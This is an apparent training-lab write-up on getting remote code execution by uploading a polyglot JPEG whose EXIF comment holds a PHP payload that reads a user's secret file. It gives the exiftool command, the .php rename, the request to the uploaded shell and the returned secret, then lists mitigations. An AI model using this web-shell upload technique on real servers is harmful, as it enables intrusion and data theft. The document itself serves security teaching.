# Lab: Remote Code Execution via Polyglot Web Shell Upload

## Objective:
Bypass the application's image content validation by uploading a polyglot image containing PHP code, retrieve Carlos's secret, and solve the lab.

--- 

## Steps:

1. I logged into my account using the provided credentials:

Username: wiener
Password: peter

2. I prepared a legitimate JPEG image.

3. I used ExifTool to embed my PHP payload inside the image metadata:

exiftool -Comment='<?php echo file_get_contents("/home/carlos/secret"); ?>' image.jpg

الباي لود ده ينفع و انا حليت ب ده

<?php echo file_get_contents("/home/carlos/secret"); ?>
بس هحطو داخل محتوي الصوره نفسو و هبعت هيتبعت بعد كده ادور علي الكود بس وسط الحجات الي متشفره


This created a polyglot file that was still a valid JPEG image while also containing executable PHP code.

4. I renamed the image to:

test.php

5. I uploaded the modified file through the avatar upload functionality.

6. The application accepted the upload because it only verified that the file was a valid image. Since the PHP payload was stored inside the image metadata, the upload passed the image validation checks.

7. I accessed the uploaded file:

GET /files/avatars/test.php

8. The server interpreted the file as PHP and executed the embedded payload.

9. The response returned Carlos's secret:

JLOUY2zgQKduuyu8bkrhal7c2wGDx62Z

10. I copied the secret and submitted it.

The lab was successfully solved.

--- 

## Vulnerability:
Remote Code Execution via Polyglot File Upload

## Cause:
The application validated that uploaded files were genuine images but failed to prevent executable PHP code from being embedded inside the image metadata. Since the uploaded file had a .php extension and remained a valid JPEG, the web server executed it as PHP.

--- 

## Takeaway:

A Polyglot file is a single file that is valid as two different formats at the same time.

## In this lab:

- The file was a valid JPEG image.
- The same file also contained executable PHP code inside its metadata.

Applications should never rely only on image validation.

## A secure implementation should:

- Validate file extensions using a whitelist.
- Validate MIME types server-side.
- Validate magic bytes (file signature).
- Strip EXIF metadata from uploaded images.
- Store uploaded files outside the web root.
- Disable execution permissions inside upload directories.

If an uploaded image can still contain executable server-side code, an attacker may achieve Remote Code Execution (RCE) even though the file passes image validation.
